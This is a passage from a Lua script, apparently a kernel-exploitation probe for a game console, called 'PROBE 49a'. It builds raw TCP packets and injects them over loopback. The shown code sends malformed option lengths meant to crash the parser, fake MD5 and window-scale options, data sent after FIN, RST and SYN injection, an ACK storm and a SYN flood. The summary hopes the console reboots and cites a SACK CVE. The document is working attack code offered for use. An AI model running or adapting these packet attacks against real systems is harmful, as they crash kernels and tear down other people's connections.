        3, 3, 14,                            -- Window Scale = 14 (max useful)
        0, 0, 0, 0                           -- padding
    )
    build_tcp(cli_port, SERVER_PORT, seq, ack, TCP_ACK, 65535, ws_opts)
    send_inject(20 + 28, "E11: WinScale=14 in non-SYN")
end

-- E12: TCP-MD5 option (kind=19, len=18, 16 bytes digest)
do
    for i = 0, 511 do safe_wb(pkt + i, 0) end
    local md5_opts = string.char(
        1, 1,                                -- NOP NOP
        19, 18                               -- MD5 kind=19, len=18
    )
    -- 16 bytes of fake MD5 digest
    for i = 0, 15 do md5_opts = md5_opts .. string.char(0xAA) end
    build_tcp(cli_port, SERVER_PORT, seq, ack, TCP_ACK, 65535, md5_opts)
    send_inject(20 + 40, "E12: TCP-MD5 option (fake digest)")
end

-- E13: Unknown option type (kind=253, experimental)
do
    for i = 0, 511 do safe_wb(pkt + i, 0) end
    local unk_opts = string.char(
        253, 8, 0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE,  -- unknown kind=253
        0, 0, 0, 0                                       -- padding
    )
    build_tcp(cli_port, SERVER_PORT, seq, ack, TCP_ACK, 65535, unk_opts)
    send_inject(20 + 32, "E13: unknown option kind=253")
end

-- E14: Option length = 0 (parser loop/crash)
do
    for i = 0, 511 do safe_wb(pkt + i, 0) end
    local bad_opts = string.char(
        1, 1,
        42, 0,                               -- kind=42, len=0 (INVALID — may loop parser)
        0, 0, 0, 0
    )
    build_tcp(cli_port, SERVER_PORT, seq, ack, TCP_ACK, 65535, bad_opts)
    send_inject(20 + 28, "E14: option kind=42 len=0 (parser crash?)")
end

-- E15: Option length = 1 (less than minimum 2)
do
    for i = 0, 511 do safe_wb(pkt + i, 0) end
    local bad_opts = string.char(
        1, 1,
        42, 1,                               -- kind=42, len=1 (< minimum 2)
        0, 0, 0, 0
    )
    build_tcp(cli_port, SERVER_PORT, seq, ack, TCP_ACK, 65535, bad_opts)
    send_inject(20 + 28, "E15: option kind=42 len=1 (undersize)")
end

-- E16: Option length = 255 (max, extends past packet)
do
    for i = 0, 511 do safe_wb(pkt + i, 0) end
    local bad_opts = string.char(
        1, 1,
        42, 255,                             -- kind=42, len=255 (way past packet end)
        0, 0, 0, 0
    )
    build_tcp(cli_port, SERVER_PORT, seq, ack, TCP_ACK, 65535, bad_opts)
    send_inject(20 + 28, "E16: option len=255 (read past buffer)")
end

print("")

-- ============================================
-- SECTION F: State transition attacks
-- ============================================
print("--- SECTION F: State transition attacks ---")
print("")

-- F1: Send data after FIN (post-close injection)
-- First close the client side to send FIN
do
    local ok, ret = pcall(function()
        return sc_write(uint64(cli_fd), uint64(send_buf), uint64(10))
    end)
    print(string.format("  pre-close client write: ret=%d", ok and to_num(ret) or -999))
end

-- Re-derive seq from TCP_INFO if possible
if cli_seq_offset then
    local tmp_info = memory.alloc(256)
    for i = 0, 255 do safe_wb(tmp_info + i, 0) end
    local tmp_len = memory.alloc(4)
    safe_wd(tmp_len, 240)
    pcall(function()
        sc_getsockopt(uint64(cli_fd), uint64(IPPROTO_TCP), uint64(32),
            uint64(tmp_info), uint64(tmp_len))
    end)
    seq = safe_rd(tmp_info + cli_seq_offset) or seq
    if cli_ack_offset then
        ack = safe_rd(tmp_info + cli_ack_offset) or ack
    end
end

-- Now close client (sends FIN)
pcall(function() sc_close(uint64(cli_fd)) end)
print("  client closed (FIN sent)")

-- Inject data segment as if client is still sending (after FIN)
for i = 0, 511 do safe_wb(pkt + i, 0) end
build_tcp(cli_port, SERVER_PORT, seq + 1, ack, TCP_PSH + TCP_ACK, 65535, nil)
for i = 0, 49 do safe_wb(pkt + 40 + i, 0xEE) end
send_inject(90, "F1: data after FIN (post-close)")

-- F2: RST in TIME_WAIT (server side)
for i = 0, 511 do safe_wb(pkt + i, 0) end
build_tcp(cli_port, SERVER_PORT, seq, 0, TCP_RST, 0, nil)
send_inject(40, "F2: RST in CLOSE_WAIT/TIME_WAIT")

-- F3: SYN to same port pair (recycle in TIME_WAIT)
for i = 0, 511 do safe_wb(pkt + i, 0) end
build_tcp(cli_port, SERVER_PORT, seq + 1000, 0, TCP_SYN, 65535, nil)
send_inject(40, "F3: SYN recycle in TIME_WAIT")

-- F4: ACK storm — 100 rapid ACKs to stress pcb lookup
print("  F4: sending 100 rapid ACKs...")
for i = 0, 99 do
    for j = 0, 511 do safe_wb(pkt + j, 0) end
    build_tcp(cli_port, SERVER_PORT, seq + i, ack, TCP_ACK, 65535, nil)
    build_ip(40)
    pcall(function()
        sc_sendto(uint64(raw_fd), uint64(pkt), uint64(40),
            uint64(0), uint64(lo_sa), uint64(16))
    end)
end
sent_inject = sent_inject + 100
print("  F4: 100 ACKs sent                            ret=batch")

-- F5: SYN flood to closed port (connection table stress)
print("  F5: 50 SYNs to random ports...")
for i = 0, 49 do
    for j = 0, 511 do safe_wb(pkt + j, 0) end
    local rport = 10000 + i * 100
    build_tcp(12345 + i, rport, 0x41414141 + i, 0, TCP_SYN, 65535, nil)
    build_ip(40)
    pcall(function()
        sc_sendto(uint64(raw_fd), uint64(pkt), uint64(40),
            uint64(0), uint64(lo_sa), uint64(16))
    end)
end
sent_inject = sent_inject + 50
print("  F5: 50 SYN flood sent                        ret=batch")
print("")

-- ============================================
-- SECTION G: Summary
-- ============================================
print("=== SUMMARY ===")
print("  Injected segments: " .. sent_inject)
print("  Send errors: " .. inject_errors)
print("")
if have_seq then
    print("  ★ Sequence numbers extracted from TCP_INFO!")
    print(string.format("    Client SND_NXT at offset +%d", cli_seq_offset or -1))
    print(string.format("    Client RCV_NXT at offset +%d", cli_ack_offset or -1))
    print(string.format("    Server SND_NXT at offset +%d", srv_seq_offset or -1))
    print(string.format("    Server RCV_NXT at offset +%d", srv_ack_offset or -1))
else
    print("  Sequence numbers not found — used blind injection")
end
print("")
print("  If console rebooted → kernel TCP bug found!")
print("  Check which variant was last printed before crash.")
print("")
print("  Key attacks:")
print("    D2: RST injection (connection teardown)")
print("    D3: SYN in ESTABLISHED (RFC 5961)")
print("    D7: Zero window (persist timer)")
print("    E1-E7: SACK processing (CVE-2019-5599)")
print("    E8-E9: Timestamp PAWS")
print("    E14-E16: TCP option len bugs (parser crash)")
print("    F1: Data after FIN")
print("    F4: ACK storm")

-- Cleanup
pcall(function() sc_close(uint64(acc_fd)) end)
pcall(function() sc_close(uint64(srv_fd)) end)
pcall(function() sc_close(uint64(raw_fd)) end)

print("")
print("=== PROBE 49a COMPLETE ===")
